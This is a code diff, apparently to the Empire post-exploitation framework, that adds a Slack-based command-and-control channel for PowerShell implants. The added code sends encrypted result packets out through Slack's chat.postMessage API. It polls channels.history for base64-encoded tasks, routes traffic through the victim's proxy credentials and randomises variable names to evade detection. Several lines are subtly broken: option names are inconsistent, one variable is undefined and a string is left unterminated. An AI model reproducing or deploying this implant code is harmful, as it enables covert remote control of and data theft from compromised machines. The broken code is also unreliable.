@@ -213,11 +213,6 @@ class Listener:
             profile = listener_options['DefaultProfile']['Value']
             launcher_cmd = listener_options['Launcher']['Value']
             staging_key = listener_options['StagingKey']['Value']
-            poll_interval = listener_options['PollInterval']['Value']
-            base_folder = listener_options['BaseFolder']['Value'].strip("/")
-            staging_folder = listener_options['StagingFolder']['Value']
-            taskings_folder = listener_options['TaskingsFolder']['Value']
-            results_folder = listener_options['ResultsFolder']['Value']
 
             if language.startswith("power"):
                 launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
@@ -331,16 +326,17 @@ class Listener:
         working_hours = listenerOptions['WorkingHours']['Value']
         profile = listenerOptions['DefaultProfile']['Value']
         agent_delay = listenerOptions['DefaultDelay']['Value']
+        api_token = listener_options['APIToken']['Value']
+        channel_id = listener_options['ChannelComms_ID']['Value']
 
         if language.lower() == 'powershell':
             f = open("%s/data/agent/stagers/slack.ps1" % self.mainMenu.installPath)
             stager = f.read()
             f.close()
 
-            stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
             stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
-            stager = stager.replace("REPLACE_TOKEN", token)
-            stager = stager.replace("REPLACE_POLLING_INTERVAL", str(agent_delay))
+            stager = stager.replace('REPLACE_SLACK_API_TOKEN', api_token)
+            stager = stager.replace('REPLACE_SLACK_CHANNEL', channel_id)
 
             if working_hours != "":
                 stager = stager.replace("REPLACE_WORKING_HOURS", working_hours)
@@ -416,6 +412,9 @@ class Listener:
         This should be implemented for the module.
         """
 
+        api_token = listener_options['APIToken']['Value']
+        channel_id = listener_options['ChannelComms_ID']['Value']
+
         if language:
             if language.lower() == 'powershell':
 
@@ -427,19 +426,116 @@ class Listener:
                 getTask = """
                     $script:GetTask = {
 
+                        try {
 
+                            function ConvertFrom-Json20([object] $item){ 
+                                add-type -assembly system.web.extensions
+                                $ps_js=new-object system.web.script.serialization.javascriptSerializer
+                                return ,$ps_js.DeserializeObject($item)
+                            }
+
+                            function Decode-Base64 {
+                                param($base64)
+                                $bytes = [convert]::FromBase64String($base64)
+                                return [System.Text.Encoding]::UTF8.GetString($bytes)
+                            }
+
+                            # meta 'TASKING_REQUEST' : 4
+                            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
+                            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
+
+                            # build the web request object
+                            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
+
+                            # set the proxy settings for the WC to be the default system settings
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                            if($Script:Proxy) {
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
+                            }
+
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
+                            $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
+
+                            # choose a random valid URI for checkin
+                            $taskURI = $script:TaskURIs | Get-Random
+
+                            # wait for listener to respond before proceeding
+                            $listener_replied=$false
+                            while($listener_replied -eq $false) {
+                                Start-Sleep -Seconds 1
+                                $listener_replied=$false
+
+                                $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded')
+                                $slack_response2=$wc.UploadString('https://slack.com/api/channels.history','POST','token=%s&channel=%s&oldest=$($script:current_ts)')
+                                $slack_response2=ConvertFrom-Json20 $slack_response2
+
+                                if($slack_response2.messages.count -ne 0) {
+                                    $result=Decode-Base64 $slack_response2.messages[0].text
+                                    if($raw) {
+                                        $listener_replied=$true
+                                    }
+                                }
+                            }
+
+                            $result
+                            
+                        }
+                        catch [Net.WebException] {
+                            $script:MissedCheckins += 1
+                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                # restart key negotiation
+                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                            }
+                        }
                     }
-                """
+                """ % (api_token, channel_id)
 
                 sendMessage = """
                     $script:SendMessage = {
                         param($Packets)
 
-                        if($Packets) {
+                        function ConvertFrom-Json20([object] $item){ 
+                            add-type -assembly system.web.extensions
+                            $ps_js=new-object system.web.script.serialization.javascriptSerializer
+                            return ,$ps_js.DeserializeObject($item)
+                        }
 
+                        if($Packets) {
+                            
+                            $encBytes = encrypt-bytes $packets
+                            $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5
+                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($RoutingPacket)
+                            $RoutingPacket_base64 = [Convert]::ToBase64String($bytes)
+
+                            # build the web request object
+                            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
+                            # set the proxy settings for the WC to be the default system settings
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                            if($Script:Proxy) {
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
+                            }
+
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
+                            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+
+                            try {
+                                # get a random posting URI
+                                $taskURI = $Script:TaskURIs | Get-Random
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
+                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=%s&channel=%s&text=$RoutingPacket_base64)
+
+                                # grab the timestamp from the sent message so we can track a response
+                                $slack_response = ConvertFrom-Json20 $response
+                                $script:current_ts = $slack_response.ts
+
+                            }
+                            catch [System.Net.WebException]{}
                         }
                     }
-                """
+                """ % (api_token, channel_id)
 
                 return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"
 
@@ -447,9 +543,9 @@ class Listener:
                 # send_message()
                 pass
             else:
-                print helpers.color("[!] listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
+                print helpers.color("[!] listeners/slack generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
         else:
-            print helpers.color('[!] listeners/template generate_comms(): no language specified!')
+            print helpers.color('[!] listeners/slack generate_comms(): no language specified!')
 
 
     def start_server(self, listenerOptions):
